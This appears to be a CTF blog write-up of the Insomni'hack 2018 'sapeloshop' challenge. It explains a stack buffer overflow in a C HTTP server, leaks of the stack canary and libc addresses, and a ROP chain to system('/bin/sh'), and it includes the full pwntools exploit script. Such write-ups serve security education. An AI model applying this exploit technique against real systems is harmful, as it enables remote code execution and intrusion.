---
layout: post
category: Pwn
title: Insomni'hack teaser 2018 sapeloshop
tags: 
    - kowu
---

First of all, I assume that this was not the intended solution for the challenge as it was labeled with `Difficulty: Medium-Hard`. There were multiple bugs (two buffer overflow and a use after free, double free). I opted to solve it the easy way with a good old buffer overflow.

The challenge itself was a handwritten HTTP server in C. You can put items in your shopping cart, increase and decrease their amount, and remove them from the cart. We were provided with the binary and libc, aslr, nx and stack canaries turned on. The bug I exploited was in the POST request handling. Consider following pseudocode:
```c
bool keepalive = true;
while(keepalive) {
    char buf[0x4000];
    int pos;
    pos = read(fd, buf, 0x4000);
    if (!strstr(buf, "keep-alive"))
        keepalive = false;
    if (strstr(buf, "Content-Length"))
        read(fd, &buf[pos], MIN(getcontentlength(buf), 1024));
    dostuff(buf);
}
```
So basically a simple buffer overflow. But before exploiting we need to leak the stack canary and the libc / proc base address. Wich was pretty easy. As the POST data is reused later, we could just overflow and leak by viewing our shopping cart (GET /cart HTTP/1.1).
![m1](/assets/img/insomni_sapelo.png)
The first red area is the HTTP request, second one is POST data. First green square is the stack canary, second a proc pointer and the third one belongs to libc_start_main_ret. If we send the above payload an item will be added to the shopping cart with the name "AAAA[cancary][procpointer]".
By increasing the amount of A's we leak the libc_start_main_ret address as well and have all we need for pwnage! On all requests we set the "keepalive" to true, until we leaked everything and overwrote the stack properly with a simple ropchain (`[pop rdi;ret]["/bin/sh"][system]`). As soon as we set "keepalive" to false the ropchain will trigger system("/bin/sh").

The flag was: `INS{sapeurs_are_the_real_heapsters}`.

Full exploitcode we used, CTF codequality, unreliable:
```python
from pwn import *

r = remote("sapeloshop.teaser.insomnihack.ch", 80)
# r = remote("localhost", 31337)

addr_binsh = 0x18cd57
addr_system = 0x45390
offset_libc = 0x20830   # libc start main ret
offset_proc = 0x2370


def leakall():
    payload = "POST /add HTTP/1.1\r\n" + \
              "Connection: keep-alive\r\n" + \
              "User-Agent: lolololol\r\n" + \
              "Filler: " + "A" * 16283 + "\r\n" + \
              "Content-Length: 0009\r\n" + \
              "\r\n" + \
              "desc=" + "A" * 4
    r.send(payload)
    r.recvuntil("</html>")
    r.send("POST /cart HTTP/1.1\r\n" +
           "Connection: keep-alive\r\n" +
           "User-Agent: lolololol\r\n" +
           "\r\n")
    r.recvuntil("img/AAAA")
    leak = "\x00" + r.recvn(13) + "\x00\x00"
    leak = struct.unpack("<QQ", leak)
    leak_canary = leak[0]
    leak_proc = leak[1] - offset_proc
    r.recvuntil("</html>")

    payload = "POST /add HTTP/1.1\r\n" + \
              "Connection: keep-alive\r\n" + \
              "User-Agent: lolololol\r\n" + \
              "Filler: " + "A" * 16283 + "\r\n" + \
              "Content-Length: 0024\r\n" + \
              "\r\n" + \
              "desc=" + "A" * 19
    r.send(payload)
    r.recvuntil("</html>")
    r.send("POST /cart HTTP/1.1\r\n" +
           "Connection: keep-alive\r\n" +
           "User-Agent: lolololol\r\n" +
           "\r\n")
    r.recvuntil("img/AAAAAAAAAAAAAAAAAAA")
    leak = r.recvn(6) + "\x00\x00"
    leak = struct.unpack("<Q", leak)
    leak_libc = leak[0] - offset_libc
    r.recvuntil("</html>")

    return leak_canary, leak_libc, leak_proc


def pwn():
    cancary, libcbase, procbase = leakall()
    print("canary: {}\nlibc: {}\nproc: {}".format(hex(cancary), hex(libcbase), hex(procbase)))

    print("ropping.")
    ropchain = "A" * 8
    ropchain += struct.pack("<Q", procbase + 0x23d3)  # pop rdi;ret
    ropchain += struct.pack("<Q", libcbase + addr_binsh)  # /bin/sh
    ropchain += struct.pack("<Q", libcbase + addr_system)  # system

    payload = "POST /add HTTP/1.1\r\n" + \
              "Connection: close\r\n" + \
              "User-Agent: lolololol\r\n" + \
              "Filler: " + "A" * 16288 + "\r\n" + \
              "Content-Length: 0048\r\n" + \
              "\r\n" + \
              "desc=AAA" + struct.pack("<Q", cancary) + ropchain
    r.send(payload)
    r.recvuntil("</html>")

    print("zerfickung!")
    r.interactive()


if __name__ == '__main__':
    pwn()

```
